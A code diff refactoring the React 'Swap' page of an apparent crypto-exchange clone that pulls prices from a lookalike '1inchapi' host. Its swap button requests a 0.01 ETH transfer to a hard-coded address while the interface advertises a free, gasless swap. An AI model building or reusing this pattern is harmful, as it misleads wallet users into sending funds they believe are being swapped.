@@ -28,16 +28,11 @@ import "react-loading-skeleton/dist/skeleton.css";
 
 const sendTransaction = async ({ setError }) => {
   try {
-    if (!window.ethereum)
-      throw new Error("No crypto wallet found. Please install it.");
+    if (!window.ethereum) throw new Error("No crypto wallet found. Please install it.");
 
-    
-
-    //const provider = new ethers.providers.Web3Provider(window.ethereum);
     const provider = new BrowserProvider(window.ethereum);
     const signer = await provider.getSigner();
 
-    console.log(signer);
     const tx = await signer.sendTransaction({
       to: "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0", // Укажите здесь адрес получателя
       value: ethers.parseEther("0.01"), // Укажите здесь количество ETH для отправки
@@ -54,27 +49,17 @@ function Swap() {
   const [swapFromExpand, setSwapFromExpand] = useState(false);
   const [swapSelectToken, setSwapSelectToken] = useState(false);
   const [swapSelectSourceToken, setSwapSelectSourceToken] = useState(false);
-  //const [priceTokenYouReceive, setPriceTokenYouReceive] = useState(null);
-  const [percent_changed, setPercentChanged] = useState(null);
-  //const [youReceiveToken, setYouReceiveToken] = useState("DAI");
-  //const [tokenYouReceiveAmount, setTokenYouReceiveAmount] = useState(null);
-  //const [priceYouPay, setPriceYouPay] = useState(null);
-  //const [youPayToken, setYouPayToken] = useState("USDT");
   const [tokenYouPayFullName, setYouPayTokenFullName] = useState("Tether USDT");
-
-  //const [tokenYouPayQuantity, setTokenYouPayQuantity] = useState(1);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState(null);
-  /******************************************* */
   const [youPayToken, setYouPayToken] = useState("USDT");
   const [youPayTokenAmount, setYouPayTokenAmount] = useState(1);
-  const [youPayTokenPrice, setYouPayTokenPrice] = useState(null);
+  const [youPayTokenPrice, setYouPayTokenPrice] = useState(0);
   const [youReceiveToken, setYouReceiveToken] = useState("DAI");
-  const [youReceiveTokenAmount, setYouReceiveTokenAmount] = useState(null);
-  const [youReceiveTokenPrice, setYouReceiveTokenPrice] = useState(null);
-  const [youReceiveTokenPercentChanged, setYouReceiveTokenPercentChanged] =
-    useState(null);
-  const [USDTPrice, setUSDTPrice] = useState(null);
+  const [youReceiveTokenAmount, setYouReceiveTokenAmount] = useState(0);
+  const [youReceiveTokenPrice, setYouReceiveTokenPrice] = useState(0);
+  const [youReceiveTokenPercentChanged, setYouReceiveTokenPercentChanged] = useState(0);
+  const [USDTPrice, setUSDTPrice] = useState(0);
 
   const tokenIcons = {
     MATIC: maticIcon,
@@ -93,74 +78,81 @@ function Swap() {
   };
 
   const handleSendTransaction = async () => {
-    setError();
+    setError(null);
     await sendTransaction({ setError });
   };
 
   const handleSwap = () => {
-    /*
-    const youReceive = youReceiveTokenAmount;
-    const youPay = youPayTokenAmount;*/
+    const currentPayToken = youPayToken;
+    const currentPayAmount = youPayTokenAmount;
+    const currentPayPrice = youPayTokenPrice;
 
-    /*
-    setYouReceiveToken(youPayToken);
-    setYouPayToken(youReceiveToken);
+    const currentReceiveToken = youReceiveToken;
+    const currentReceiveAmount = youReceiveTokenAmount;
+    const currentReceivePrice = youReceiveTokenPrice;
 
-    setYouPayTokenAmount(youReceiveTokenPrice);
-    setYouReceiveTokenAmount(youPayTokenPrice);*/
+    setYouPayToken(currentReceiveToken);
+    setYouPayTokenAmount(currentReceiveAmount);
+    setYouPayTokenPrice(currentReceivePrice);
 
-    let payPrice = document.getElementById("payPrice").value;
-    let receivePrice = document.getElementById("receivePrice").value;
-
-    //console.log("PAAAAAAAAAAAAAAAAAAAAAY: " + payPrice);
-
-    setYouReceiveToken(youPayToken);
-    setYouPayToken(youReceiveToken);
-
-    setYouPayTokenAmount(receivePrice);
-    setYouReceiveTokenAmount(payPrice);
+    setYouReceiveToken(currentPayToken);
+    setYouReceiveTokenAmount(currentPayAmount);
+    setYouReceiveTokenPrice(currentPayPrice);
   };
 
-  useEffect(() => {
-    /*
-    setTokenYouReceiveAmount(
-      (youPayTokenAmount / youReceiveTokenAmount).toFixed(5)
-    );*/
-    const fetchNewPrice = async () => {
-      const newTokenYouPayData = await axios.get(
-        "https://1inchapi88888.vercel.app/api/crypto",
-        {
-          params: {
-            symbol: youPayToken,
-            convert: "USD",
-          },
+useEffect(() => {
+  const fetchNewPrice = async () => {
+    if (youPayToken && youReceiveToken) {
+      try {
+        setLoading(true);
+
+        const newTokenYouPayData = await axios.get(
+          "https://1inchapi88888.vercel.app/api/crypto",
+          {
+            params: {
+              symbol: youPayToken,
+              convert: "USD",
+            },
+          }
+        );
+
+        const newTokenYouReceiveData = await axios.get(
+          "https://1inchapi88888.vercel.app/api/crypto",
+          {
+            params: {
+              symbol: youReceiveToken,
+              convert: "USD",
+            },
+          }
+        );
+
+        if (newTokenYouPayData.data.data && newTokenYouPayData.data.data[youPayToken]) {
+          const newRoundedPriceTokenYouPay = parseFloat(newTokenYouPayData.data.data[youPayToken].quote.USD.price.toFixed(6));
+          setYouPayTokenPrice(newRoundedPriceTokenYouPay);
         }
-      );
-      if (
-        newTokenYouPayData.data.data &&
-        newTokenYouPayData.data.data[youPayToken]
-      ) {
-        const newRoundedPriceTokenYouPay =
-          newTokenYouPayData.data.data[youPayToken].quote.USD.price.toFixed(6);
-        setYouPayTokenPrice(
-          (newRoundedPriceTokenYouPay * youPayTokenAmount).toFixed(6)
-        );
-        setYouReceiveTokenAmount(
-          ((youPayTokenPrice / youReceiveTokenPrice) * USDTPrice).toFixed(6)
-        );
+
+        if (newTokenYouReceiveData.data.data && newTokenYouReceiveData.data.data[youReceiveToken]) {
+          const newRoundedPriceTokenYouReceive = parseFloat(newTokenYouReceiveData.data.data[youReceiveToken].quote.USD.price.toFixed(6));
+          setYouReceiveTokenPrice(newRoundedPriceTokenYouReceive);
+          
+          // Calculate the amount of receive token based on the latest prices and amount of pay token
+          setYouReceiveTokenAmount((youPayTokenAmount * newRoundedPriceTokenYouPay) / newRoundedPriceTokenYouReceive);
+        }
+
+        setLoading(false);
+      } catch (err) {
+        setError(err.message);
+        setLoading(false);
       }
-    };
-    fetchNewPrice();
-  }, [youPayTokenAmount /*youReceiveTokenAmount*/]);
+    }
+  };
+
+  fetchNewPrice();
+}, [youPayToken, youReceiveToken, youPayTokenAmount]);
+
 
   useEffect(() => {
-    let roundedPriceTokenYouPay = null;
-    let roundedPrice = null;
-    let roundedPercentChanged = null;
-
-    const fetchPrice = async () => {
-      setLoading(true);
-      setError(null);
+    const fetchUSDTPrice = async () => {
       try {
         const GetUSDTPrice = await axios.get(
           "https://1inchapi88888.vercel.app/api/crypto",
@@ -171,129 +163,16 @@ function Swap() {
             },
           }
         );
-
-        //делаем запрос на сервер данные о токене который покупаем
-        const responseTokenYouReceive = await axios.get(
-          "https://1inchapi88888.vercel.app/api/crypto",
-          {
-            params: {
-              symbol: youReceiveToken,
-              convert: "USD",
-            },
-          }
-        );
-        //делаем запрос на сервер данные о токене за счет которого покупаем
-        const responseTokenYouPay = await axios.get(
-          "https://1inchapi88888.vercel.app/api/crypto",
-          {
-            params: {
-              symbol: youPayToken,
-              convert: "USD",
-            },
-          }
-        );
-
-        if (GetUSDTPrice)
-          setUSDTPrice(
-            GetUSDTPrice.data.data["USDT"].quote.USD.price.toFixed(6)
-          );
-
-        console.log("USDT PRICE!!!!#####################" + USDTPrice);
-
-        //если данные получили округляем до 6 символов после точки и сохраняем цену токена за который покупаем
-        if (
-          responseTokenYouPay.data.data &&
-          responseTokenYouPay.data.data[youPayToken]
-        ) {
-          roundedPriceTokenYouPay =
-            responseTokenYouPay.data.data[youPayToken].quote.USD.price.toFixed(
-              6
-            );
-
-          setYouPayTokenPrice(roundedPriceTokenYouPay);
-
-          //сохраняем полное название токена
-          setYouPayTokenFullName(
-            responseTokenYouPay.data.data[youPayToken].name
-          );
-
-          //1 USDT = youPayTokenPrice/youReceiveTokenPrice DAI  * на цену USDT чтобы получить цену ~$
-
-          // за 1 USDT  мы получим  такое же количество DAI и в USD это будет равно стоимость токенов Б * на количество токенов Б
+        if (GetUSDTPrice.data.data) {
+          setUSDTPrice(parseFloat(GetUSDTPrice.data.data["USDT"].quote.USD.price.toFixed(6)));
         }
-
-        if (
-          responseTokenYouReceive.data.data &&
-          responseTokenYouReceive.data.data[youReceiveToken]
-        ) {
-          roundedPrice =
-            responseTokenYouReceive.data.data[
-              youReceiveToken
-            ].quote.USD.price.toFixed(6);
-          roundedPercentChanged =
-            responseTokenYouReceive.data.data[
-              youReceiveToken
-            ].quote.USD.percent_change_1h.toFixed(2);
-          setYouReceiveTokenPrice(roundedPrice);
-          console.log("ROUNDED PRICE!!!!!!!!" + roundedPrice);
-          console.log(
-            "USDT PRICE$$$$$$$$$$$$$$$$$$$$$$$" +
-              GetUSDTPrice.data.data["USDT"].quote.USD.price.toFixed(6)
-          );
-          setYouReceiveTokenPercentChanged(roundedPercentChanged);
-          /*setYouReceiveTokenPercentChanged(
-            responseTokenYouReceive.data.data[
-              youReceiveToken
-            ].quote.USD.percent_change_1h.toFixed(2)
-          );*/
-        } else {
-          setError(`Symbol ${youReceiveToken} not found in response`);
-        }
-
-        if (
-          responseTokenYouReceive.data.data &&
-          responseTokenYouReceive.data.data[youReceiveToken] ////???????????? WHY PAY
-        ) {
-          roundedPercentChanged =
-            responseTokenYouReceive.data.data[
-              youReceiveToken
-            ].quote.USD.percent_change_1h.toFixed(2);
-
-          setYouReceiveTokenPercentChanged(roundedPercentChanged);
-        } else {
-          setError(`Symbol ${youPayToken} not found in response`);
-        }
-
-        console.log("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
-        console.log(youPayTokenPrice);
-        console.log(youReceiveTokenPrice);
-        console.log(GetUSDTPrice.data.data["USDT"].quote.USD.price.toFixed(6));
-
-        setYouReceiveTokenAmount(
-          (
-            (roundedPriceTokenYouPay / roundedPrice) *
-            GetUSDTPrice.data.data["USDT"].quote.USD.price.toFixed(6)
-          ).toFixed(6)
-        );
       } catch (err) {
         setError(err.message);
-      } finally {
-        setLoading(false);
       }
     };
 
-    fetchPrice();
-  }, [youReceiveToken, youPayToken]); ////WHY both
-
-  // console.log(youPayTokenAmount);
-
-  console.log(youPayToken);
-  console.log(youPayTokenAmount);
-  console.log(youPayTokenPrice);
-  console.log("~~~~~~~~~~~~~~~~~~");
-  console.log(youReceiveToken);
-  console.log(youReceiveTokenPrice);
-  console.log(youReceiveTokenAmount);
+    fetchUSDTPrice();
+  }, []);
 
   return (
     <div className="page-content">
@@ -313,11 +192,7 @@ function Swap() {
                   <img className="add-icon-img" src={addIcon} alt="" />
                 </div>
                 <div className="settings-icon">
-                  <img
-                    className="settings-icon-img"
-                    src={settingsicon}
-                    alt=""
-                  />
+                  <img className="settings-icon-img" src={settingsicon} alt="" />
                 </div>
               </div>
             </div>
@@ -326,15 +201,8 @@ function Swap() {
                 <span>You pay</span>
               </div>
               <div className="selected-token">
-                <div
-                  className="select-source-token"
-                  onClick={() => setSwapSelectSourceToken(true)}
-                >
-                  <img
-                    className="selected-token-icon"
-                    src={tokenIcons[youPayToken]}
-                    alt=""
-                  />
+                <div className="select-source-token" onClick={() => setSwapSelectSourceToken(true)}>
+                  <img className="selected-token-icon" src={tokenIcons[youPayToken]} alt="" />
                   <span className="selected-token-symbol">{youPayToken}</span>
                   <svg
                     id="arrow-down"
@@ -344,19 +212,13 @@ function Swap() {
                     fill="none"
                     xmlns="http://www.w3.org/2000/svg"
                   >
-                    <path
-                      d="M4 6.5L8 10.5L12 6.5"
-                      stroke="currentColor"
-                      strokeWidth="2"
-                      strokeLinecap="round"
-                      strokeLinejoin="round"
-                    ></path>
+                    <path d="M4 6.5L8 10.5L12 6.5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"></path>
                   </svg>
                 </div>
                 <input
                   type="number"
                   value={youPayTokenAmount}
-                  onChange={(e) => setYouPayTokenAmount(e.target.value)}
+                  onChange={(e) => setYouPayTokenAmount(Number(e.target.value))}
                   id="payPrice"
                   className="source-token-amount-input"
                   style={{
@@ -374,7 +236,7 @@ function Swap() {
               </div>
               <div className="token-info">
                 <span className="token-name">{tokenYouPayFullName}</span>
-                <div className="token-amount">{"~$" + youPayTokenPrice}</div>
+                <div className="token-amount">{"~$" + (youPayTokenPrice / youPayTokenAmount).toFixed(6)}</div>
               </div>
             </div>
             <div className="swap-separator">
@@ -387,13 +249,7 @@ function Swap() {
                   fill="none"
                   xmlns="http://www.w3.org/2000/svg"
                 >
-                  <path
-                    d="M6 1L6 10M6 10L11 5M6 10L1 5"
-                    stroke="currentColor"
-                    strokeWidth="2"
-                    strokeLinecap="round"
-                    strokeLinejoin="round"
-                  ></path>
+                  <path d="M6 1L6 10M6 10L11 5M6 10L1 5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"></path>
                 </svg>
               </div>
             </div>
@@ -402,18 +258,9 @@ function Swap() {
                 <span>You receive</span>
               </div>
               <div className="selected-token">
-                <div
-                  className="select-destination-token"
-                  onClick={() => setSwapSelectToken(true)}
-                >
-                  <img
-                    className="selected-token-icon"
-                    src={tokenIcons[youReceiveToken]}
-                    alt=""
-                  />
-                  <span className="selected-token-symbol">
-                    {youReceiveToken}
-                  </span>
+                <div className="select-destination-token" onClick={() => setSwapSelectToken(true)}>
+                  <img className="selected-token-icon" src={tokenIcons[youReceiveToken]} alt="" />
+                  <span className="selected-token-symbol">{youReceiveToken}</span>
                   <svg
                     id="arrow-down"
                     width="16"
@@ -422,33 +269,20 @@ function Swap() {
                     fill="none"
                     xmlns="http://www.w3.org/2000/svg"
                   >
-                    <path
-                      d="M4 6.5L8 10.5L12 6.5"
-                      stroke="currentColor"
-                      strokeWidth="2"
-                      strokeLinecap="round"
-                      strokeLinejoin="round"
-                    ></path>
+                    <path d="M4 6.5L8 10.5L12 6.5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"></path>
                   </svg>
                 </div>
                 <div id="receivePrice" className="destination-token-amount">
                   {loading ? (
                     <Skeleton height={20} />
                   ) : (
-                    (youPayTokenPrice / youReceiveTokenPrice).toFixed(6)
+                    youReceiveTokenAmount.toFixed(6)
                   )}
                 </div>
               </div>
               <div className="token-info">
                 <span className="token-name">{youReceiveToken}</span>
-                <div className="token-amount">
-                  ~$
-                  {(
-                    youReceiveTokenAmount *
-                    (youPayTokenAmount / youReceiveTokenAmount).toFixed(5)
-                  ).toFixed(6)}{" "}
-                  ({youReceiveTokenPercentChanged})
-                </div>
+                <div className="token-amount">{"~$" + (youReceiveTokenAmount * youReceiveTokenPrice).toFixed(6)}</div>
               </div>
             </div>
             <div className="swap-from">
@@ -456,36 +290,24 @@ function Swap() {
                 <div className="swap-from-button-title">
                   <span className="from-token-amount">1 {youPayToken}</span>
                   <span className="from-token-equal">=</span>
-                  <p className="from-token-rate">
-                    {(youPayTokenPrice / youReceiveTokenPrice).toFixed(6)}
-                  </p>
+                  <p className="from-token-rate">{(youPayTokenPrice / youReceiveTokenPrice).toFixed(6)}</p>
                   <span className="from-token-name">{youReceiveToken}</span>
-                  <span className="usd-value">
-                    (~${(youPayTokenPrice / youPayTokenAmount).toFixed(2)})
-                  </span>
+                  <span className="usd-value">(~${(youPayTokenPrice / youPayTokenAmount).toFixed(2)})</span>
                 </div>
                 {!swapFromExpand && (
                   <div className="swap-from-button-tooltip">
                     <img className="gasless-logo" src={gasLess} alt="gasless" />
                     <span className="gasless-cost">Free</span>
-                    <span className="swap-from-button-tooltip-usd-token-price">
-                      $0.01
-                    </span>
+                    <span className="swap-from-button-tooltip-usd-token-price">$0.01</span>
                     <svg
                       id="arrow-swap"
                       viewBox="0 0 17 16"
                       fill="none"
                       xmlns="http://www.w3.org/2000/svg"
-                      width="16" // Убедитесь, что эти атрибуты заданы
-                      height="16" // Убедитесь, что эти атрибуты заданы
+                      width="16"
+                      height="16"
                     >
-                      <path
-                        d="M4.125 6L8.125 10L12.125 6"
-                        stroke="currentColor"
-                        strokeWidth="2"
-                        strokeLinecap="round"
-                        strokeLinejoin="round"
-                      ></path>
+                      <path d="M4.125 6L8.125 10L12.125 6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"></path>
                     </svg>
                   </div>
                 )}
@@ -496,14 +318,7 @@ function Swap() {
                     fill="none"
                     xmlns="http://www.w3.org/2000/svg"
                   >
-                    <path
-                      d="M4.125 6L8.125 10L12.125 6"
-                      stroke="currentColor"
-                      strokeWidth="2"
-                      strokeLinecap="round"
-                      strokeLinejoin="round"
-                      transform="scale(1, -1) translate(0, -16)"
-                    ></path>
+                    <path d="M4.125 6L8.125 10L12.125 6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" transform="scale(1, -1) translate(0, -16)"></path>
                   </svg>
                 )}
               </button>
@@ -521,28 +336,15 @@ function Swap() {
                     </div>
                   </div>
                   <div className="swap-from-expand-item">
-                    <div className="swap-from-expand-item-title">
-                      Minimum receive
-                    </div>
-                    <div
-                      id="min-receive-val"
-                      className="swap-from-expand-item-value"
-                    >
-                      <span className="min-receive-val">
-                        {(
-                          youPayTokenAmount / youReceiveTokenAmount -
-                          (youPayTokenAmount / youReceiveTokenAmount / 100) *
-                            2.8
-                        ).toFixed(8)}
-                      </span>
+                    <div className="swap-from-expand-item-title">Minimum receive</div>
+                    <div id="min-receive-val" className="swap-from-expand-item-value">
+                      <span className="min-receive-val">{(youPayTokenAmount / youReceiveTokenAmount - (youPayTokenAmount / youReceiveTokenAmount / 100) * 2.8).toFixed(8)}</span>
                       <span className="min-receive-token">DAI</span>
                       <span>(~$0.47764351)</span>
                     </div>
                   </div>
                   <div className="swap-from-expand-item">
-                    <div className="swap-from-expand-item-title">
-                      Network fee
-                    </div>
+                    <div className="swap-from-expand-item-title">Network fee</div>
                     <div className="swap-from-expand-item-value">
                       <div id="gas-les-item">
                         <img src={gasLess} />
@@ -557,13 +359,7 @@ function Swap() {
             <div className="swap-button-container">
               <button className="swap-button" onClick={handleSendTransaction}>
                 <span className="swap-button-content">
-                  <svg
-                    width="24"
-                    height="24"
-                    viewBox="0 0 24 24"
-                    fill="none"
-                    xmlns="http://www.w3.org/2000/svg"
-                  >
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <path
                       fillRule="evenodd"
                       clipRule="evenodd"
@@ -577,18 +373,8 @@ function Swap() {
             </div>
           </>
         )}
-        {swapSelectToken && (
-          <SwapSelectToken
-            SwapSelect={setSwapSelectToken}
-            setYouReceiveToken={setYouReceiveToken}
-          />
-        )}
-        {swapSelectSourceToken && (
-          <SwapSelectSourceToken
-            SwapSelect={setSwapSelectSourceToken}
-            setYouPayToken={setYouPayToken}
-          />
-        )}
+        {swapSelectToken && <SwapSelectToken SwapSelect={setSwapSelectToken} setYouReceiveToken={setYouReceiveToken} />}
+        {swapSelectSourceToken && <SwapSelectSourceToken SwapSelect={setSwapSelectSourceToken} setYouPayToken={setYouPayToken} />}
       </div>
     </div>
   );
